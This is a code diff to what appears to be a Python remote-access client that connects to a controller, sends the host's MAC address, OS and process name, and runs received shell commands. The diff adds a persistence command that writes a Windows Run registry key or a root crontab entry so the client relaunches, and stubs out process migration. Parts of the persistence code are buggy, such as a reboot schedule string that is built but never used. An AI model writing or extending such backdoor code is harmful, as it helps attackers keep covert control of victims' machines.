@@ -14,6 +14,10 @@ import platform
 import subprocess
 import tqdm
 import getpass
+#import ctypes
+#import ctypes.wintypes as wintypes
+from winreg import *
+from crontab import CronTab
 from uuid import getnode
 
 BUFF_SIZE = 1024
@@ -32,8 +36,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.send(mac.encode())
     family = platform.system()
     release = platform.release()
-    opsys = family + ' ' + release
-    s.send(opsys.encode())
+    s.send(family.encode())
+    s.send(release.encode())
     process = psutil.Process(os.getpid())
     processName = process.name()
     s.send(processName.encode())
@@ -128,11 +132,23 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.send(
                 results)  # results contains a bytes object with the output/stderr of the command run by subprocess.run
 
-        elif int(cmd) == 8: # TODO Process Migration (tentative)
-            exit()
+        # elif int(cmd) == 8:  # Migrate to a target process, currently WINDOWS ONLY **PLACEHOLDER** TODO IMPLEMENT THIS
+            # targetPid = s.recv(BUFF_SIZE).decode()  # Target PID to migrate to
 
-        elif int(cmd) == 9: # TODO Persistence
-            exit()
+        elif int(cmd) == 8:  # Persistence, registry for Windows, Crontab for *nix
+            exe = 'python' + cwd + '\\' + sys.argv[0] + ' ' + sys.argv[1] + ' ' + sys.argv[2]
+            if family == 'Windows':  # Do Windows persistence since we're on Windows
+                key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+                # Create our Run reg key entry using this script and our arguments
+                SetValueEx(key, 'client', 0, REG_SZ, exe)
+                key.Close()
+            else:  # We're on a *nix system, try Cron
+                cron = CronTab(user='root')
+                reboot = '@reboot ' + exe  # Make our script run on reboot
+                job = cron.new(command=exe)
+
+                cron.write()
+            s.send('Success'.encode())
 
         elif int(cmd) == 0:  # Exit
             exit()
